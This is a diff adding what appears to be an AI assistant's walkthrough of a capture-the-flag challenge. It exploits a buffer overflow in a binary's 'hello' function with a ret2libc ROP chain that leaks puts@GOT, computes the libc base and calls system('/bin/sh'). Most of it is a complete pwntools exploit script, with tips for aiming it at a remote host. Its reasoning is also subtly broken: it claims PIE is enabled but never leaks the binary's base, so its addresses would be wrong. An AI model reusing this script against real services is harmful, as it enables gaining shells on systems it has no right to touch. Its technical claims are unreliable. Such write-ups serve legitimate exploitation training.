@@ -1,0 +1,119 @@
+To solve this challenge using `pwntools`, we need to exploit the buffer overflow vulnerability in the `hello` function to perform a Return-Oriented Programming (ROP) attack. Since the binary has `PIE` enabled, we need to leak a libc address to calculate the base address of libc and then use it to execute a system call (e.g., `system("/bin/sh")`) to get a shell.
+
+Here are the steps to solve the challenge:
+
+---
+
+### Steps to Solve the Challenge
+
+1. **Analyze the Binary**:
+   - The `hello` function has a buffer overflow vulnerability in the `read` function, which allows us to overwrite the return address.
+   - The binary has `PIE` enabled, so we need to leak a libc address to calculate the base address of libc.
+
+2. **Leak a libc Address**:
+   - Use the `puts` function to leak the address of a libc function (e.g., `puts` or `read`) from the Global Offset Table (GOT).
+
+3. **Calculate libc Base Address**:
+   - Subtract the offset of the leaked function from the leaked address to calculate the base address of libc.
+
+4. **Build ROP Chain**:
+   - Use the libc base address to find the address of `system` and `/bin/sh` string.
+   - Build a ROP chain to call `system("/bin/sh")`.
+
+5. **Exploit**:
+   - Send the payload to trigger the buffer overflow and execute the ROP chain.
+
+---
+
+### Code to Solve the Challenge
+
+Here is the Python code using `pwntools`:
+
+```python
+from pwn import *
+
+# Set up pwntools for the target binary
+binary = './rop'
+elf = ELF(binary)
+libc = ELF('./libc.so.6')  # Load the provided libc file
+
+# Start the process or connect to the remote server
+p = process(binary)  # Use `remote('host', port)` for remote challenges
+
+# Helper function to leak an address
+def leak_address():
+    # Overflow the buffer to control the return address
+    payload = b'A' * 24  # Overflow buffer (24 bytes)
+    payload += b'B' * 8  # Overwrite saved RBP (8 bytes)
+    
+    # ROP chain to leak a libc address
+    rop = ROP(elf)
+    rop.puts(elf.got['puts'])  # Call puts(puts@GOT)
+    rop.call(elf.symbols['hello'])  # Return to hello to continue execution
+    payload += rop.chain()
+    
+    # Send the payload
+    p.sendlineafter("What's your name?", payload)
+    
+    # Receive the leaked address
+    p.recvline()  # Skip the first line
+    leaked_puts = u64(p.recvline().strip().ljust(8, b'\x00'))  # Read leaked address
+    log.info(f"Leaked puts address: {hex(leaked_puts)}")
+    return leaked_puts
+
+# Step 1: Leak a libc address
+leaked_puts = leak_address()
+
+# Step 2: Calculate libc base address
+libc_base = leaked_puts - libc.symbols['puts']
+log.info(f"Libc base address: {hex(libc_base)}")
+
+# Step 3: Calculate system and "/bin/sh" addresses
+system_addr = libc_base + libc.symbols['system']
+bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
+
+log.info(f"system address: {hex(system_addr)}")
+log.info(f"/bin/sh address: {hex(bin_sh_addr)}")
+
+# Step 4: Build the final ROP chain
+payload = b'A' * 24  # Overflow buffer
+payload += b'B' * 8  # Overwrite saved RBP
+
+# ROP chain to call system("/bin/sh")
+rop = ROP(elf)
+rop.call(system_addr, [bin_sh_addr])  # Call system("/bin/sh")
+payload += rop.chain()
+
+# Step 5: Send the final payload
+p.sendlineafter("What's your name?", payload)
+
+# Step 6: Interact with the shell
+p.interactive()
+```
+
+---
+
+### Explanation of the Code
+
+1. **Leaking libc Address**:
+   - We use a ROP chain to call `puts` with the address of `puts@GOT` as an argument. This leaks the runtime address of `puts` in libc.
+
+2. **Calculating libc Base**:
+   - Using the leaked address of `puts`, we calculate the base address of libc by subtracting the offset of `puts` in libc.
+
+3. **Building the Final ROP Chain**:
+   - We use the libc base address to calculate the addresses of `system` and the `/bin/sh` string.
+   - We build a ROP chain to call `system("/bin/sh")`.
+
+4. **Exploiting the Binary**:
+   - We send the final payload to trigger the buffer overflow and execute the ROP chain, giving us a shell.
+
+---
+
+### Notes
+
+- Make sure to adjust the buffer size (`24` in this case) based on the offset to the return address in the binary.
+- If the challenge is remote, replace `process(binary)` with `remote('host', port)`.
+- Use `gdb` or `pwndbg` to debug the binary and verify the offsets and addresses.
+
+This approach should work for the given challenge. Let me know if you need further clarification!
